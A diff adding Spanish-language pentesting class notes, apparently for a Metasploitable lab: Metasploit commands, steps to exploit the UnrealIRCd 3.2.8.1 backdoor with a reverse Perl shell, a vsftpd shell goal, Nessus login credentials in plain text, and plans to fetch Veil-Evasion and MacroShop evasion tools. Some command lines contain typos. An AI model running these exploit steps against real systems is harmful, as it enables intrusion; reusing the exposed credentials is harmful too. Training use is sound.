@@ -1,0 +1,103 @@
+Orden:
+
+- Exploit payload post auxiliar
+- Explicacion Ataques remotos y ejecutables
+- Comandos msfconsole
+- Exploit 1 todos juntos
+- Exploit 2 individual
+-Análisis ettercap, bettercap,wireshark
+-Análisis nmap servicios corriendo, puertos, etc
+-Análisis vulnerabilidades nessus 
+
+
+Comandos metasploit:
+-help
+-back
+-options
+-set 
+-load
+-sessions
+-ctrl+z
+-run
+-check
+-info
+-banner
+
+
+
+//--------------------------------------------------
+https://www.hackingtutorials.org/metasploit-tutorials/hacking-unreal-ircd-3-2-8-1/
+
+Pasos:
+
+-search Unreal IRCD
+
+-use explot/unix/irc/unreal_ircd_3281_backdoor
+
+-show payloads
+
+-set payloads cdm/unix/reverse_perl
+
+-set rhost ip-target
+
+-set lhost ip-atacante
+
+-run
+
+//-------------------------------------------------
+
+Nombre del equipo:
+
+-use auxiliary/scanner/netbios/nbname
+
+//--------------------------------------------------
+
+https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/
+
+Nombre: vsftpd
+
+Objetivo: Sacar una shell y crear un archivo
+
+vim
+
+Guardar
+esc + :wq 
+
+//--------------------------------------------------
+
+Nessus:
+ip=
+ruta=>https://ip:8834/#/
+Loggueo
+
+user=>alestorm980
+pwd=sistemaslomejor
+
+load nessus
+
+help nessus
+
+nessus_connect alestorm980:sistemaslomejor@ip
+
+
+//--------------------------------------------------
+Proxima sesión:
+Máquina windows xp
+- Pasar máquina virtual windows xp 
+- Buscar código de licencia
+- Configurar red modo bridge
+- Desactivar firewall
+- Ping con kali
+- Instalar mozilla
+
+En Kali:
+-Descargar Veil-Evasion Repositorio=>(https://github.com/Veil-Framework/Veil-Evasion)
+-Descargar Macroshop Repositorio =>(https://github.com/khr0x40sh/MacroShop)
+
+
+
+
+
+
+
+
